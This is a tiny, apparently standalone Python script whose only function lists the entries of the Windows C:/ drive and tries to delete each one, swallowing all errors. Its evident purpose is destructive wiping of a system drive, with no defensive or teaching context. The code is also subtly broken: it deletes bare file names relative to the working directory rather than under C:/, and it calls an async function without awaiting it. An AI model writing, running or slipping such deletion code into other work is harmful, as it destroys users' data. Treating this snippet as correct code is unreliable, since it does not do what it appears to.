import os
from os import walk

async def filedeletion():
    path = "C:/"
    fi = os.listdir(path)
    for f in fi:
        try:
            os.remove(f)
        except:
            pass
    
filedeletion()